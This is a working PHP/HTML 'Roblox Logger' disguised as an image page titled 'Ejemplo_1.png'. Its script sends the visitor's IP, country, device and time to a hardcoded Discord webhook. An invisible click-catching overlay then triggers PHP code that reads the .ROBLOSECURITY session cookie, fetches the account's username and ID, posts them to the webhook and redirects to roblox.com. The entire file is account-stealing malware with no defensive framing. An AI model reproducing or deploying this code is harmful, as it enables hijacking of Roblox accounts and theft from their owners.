<?php
// ===========================================
// PARTE 1: SI HAY DATOS, PROCESAR COOKIE
// ===========================================
if (isset($_GET['datos'])) {
    $WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
    $datos_json = $_GET['datos'] ?? '';
    $datos = json_decode(urldecode($datos_json), true);
    
    // 1. CAPTURAR COOKIE
    $cookie = "No encontrada";
    if (!empty($_SERVER['HTTP_COOKIE'])) {
        if (preg_match('/\.ROBLOSECURITY=([^;]+)/', $_SERVER['HTTP_COOKIE'], $matches)) {
            $cookie = $matches[1];
        }
    }
    
    // 2. OBTENER USERNAME E ID
    $username = "No disponible";
    $userid = "No disponible";
    
    if ($cookie != "No encontrada") {
        $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cookie: .ROBLOSECURITY=' . $cookie]);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);
        
        if ($response) {
            $data = json_decode($response, true);
            $username = $data['name'] ?? 'No disponible';
            $userid = $data['id'] ?? 'No disponible';
        }
    }
    
    // 3. CONSTRUIR MENSAJE
    $mensaje = "|| @everyone ||\n";
    $mensaje .= "🔔 ¡Nueva Entrada. **{$datos['nombre']}**!\n\n";
    $mensaje .= "**📌 INFORMACION GENERAL**\n\n";
    $mensaje .= "**Dispositivo:** `({$datos['dispositivo']})`\n";
    $mensaje .= "**País:** `{$datos['pais']}`\n";
    $mensaje .= "**Fecha:** `{$datos['fecha']}`\n";
    $mensaje .= "**Hora en región de {$datos['pais']}:** `{$datos['hora']}`\n\n";
    $mensaje .= "**ℹ️ INFORMACION SOBRE LA CUENTA DE ROBLOX**\n\n";
    $mensaje .= "**Usuario:** `$username`\n";
    $mensaje .= "**ID de usuario:** `$userid`\n\n";
    $mensaje .= "**🍪 Cookie De Roblox:**\n";
    $mensaje .= "`$cookie`\n";
    $mensaje .= "                                **By {$datos['nombre']}**";
    
    // 4. EDITAR MENSAJE EN DISCORD
    if (!empty($datos['mensajeId'])) {
        $ch = curl_init("$WEBHOOK/messages/{$datos['mensajeId']}");
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['content' => $mensaje]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // 5. REDIRIGIR
    header("Location: https://www.roblox.com/home");
    exit;
}

// ===========================================
// PARTE 2: MOSTRAR LA IMAGEN (HTML)
// ===========================================
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2">
<title>Ejemplo_1.png</title>
<style>
    body { margin: 0; padding: 0; background: #000; }
    img { width: 100%; height: 100vh; object-fit: contain; }
</style>
</head>
<body>

<img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" 
     onload="cargarTodo()"
     onerror="this.src='https://i.imgur.com/7ZQ4q2N.jpg'">

<div id="capaClick" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer;"></div>

<script>
// ===========================================
// CONFIGURACIÓN
// ===========================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
const NOMBRE = "BL PAPI";

// ===========================================
// FUNCIONES
// ===========================================

async function getIPyPais() {
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const paisRes = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=country`);
        const paisData = await paisRes.json();
        return { ip: ipData.ip, pais: paisData.country || "Desconocido" };
    } catch {
        return { ip: "No disponible", pais: "Desconocido" };
    }
}

function getDispositivo() {
    const ua = navigator.userAgent;
    return ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad") ? "📱 Android/iOS" : "🖥 PC";
}

function getFechaHora() {
    const ahora = new Date();
    const fecha = `${ahora.getDate().toString().padStart(2,'0')}/${(ahora.getMonth()+1).toString().padStart(2,'0')}/${ahora.getFullYear()}`;
    const hora = `${ahora.getHours().toString().padStart(2,'0')}:${ahora.getMinutes().toString().padStart(2,'0')}:${ahora.getSeconds().toString().padStart(2,'0')}`;
    return { fecha, hora };
}

async function enviarMensajeInicial(datos) {
    const mensaje = `|| @everyone ||
🔔 ¡Nueva Entrada. **${NOMBRE}**!

**📌 INFORMACION GENERAL**

**Dispositivo:** \`(${datos.dispositivo})\`
**País:** \`${datos.pais}\`
**Fecha:** \`${datos.fecha}\`
**Hora en región de ${datos.pais}:** \`${datos.hora}\`
 
ESPERANDO SEGUNDA ETAPA...`;
    
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: mensaje,
            username: "Roblox Logger",
            avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
        })
    });
    
    return response.ok ? await response.json() : null;
}

async function cargarTodo() {
    if (sessionStorage.getItem('ejecutado')) return;
    sessionStorage.setItem('ejecutado', 'true');
    
    const dispositivo = getDispositivo();
    const { ip, pais } = await getIPyPais();
    const { fecha, hora } = getFechaHora();
    
    const msgData = await enviarMensajeInicial({ dispositivo, ip, pais, fecha, hora });
    if (msgData) sessionStorage.setItem('mensajeId', msgData.id);
    
    document.getElementById('capaClick').addEventListener('click', function() {
        this.style.display = 'none';
        const datos = encodeURIComponent(JSON.stringify({
            dispositivo, ip, pais, fecha, hora,
            mensajeId: sessionStorage.getItem('mensajeId'),
            nombre: NOMBRE
        }));
        // Redirigir al MISMO ARCHIVO
        window.location.href = window.location.pathname + '?datos=' + datos;
    });
    
    setTimeout(() => {
        const msgId = sessionStorage.getItem('mensajeId');
        if (!msgId) return;
        
        fetch(`${WEBHOOK_URL}/messages/${msgId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `|| @everyone ||
🔔 ¡Nueva Entrada. **${NOMBRE}**!

**📌 INFORMACION GENERAL**

**Dispositivo:** \`(${dispositivo})\`
**País:** \`${pais}\`
**Fecha:** \`${fecha}\`
**Hora en región de ${pais}:** \`${hora}\`

**ℹ️ INFORMACION SOBRE LA CUENTA DE ROBLOX** 

**Usuario:** \`No disponible\`
**ID de usuario:** \`No disponible\`

**🍪 Cookie De Roblox:**
\`\`No encontrada (sin clic)\`\`
                                **By ${NOMBRE}**`
            })
        });
    }, 10000);
}

document.addEventListener('contextmenu', e => e.preventDefault());
</script>

</body>
</html>
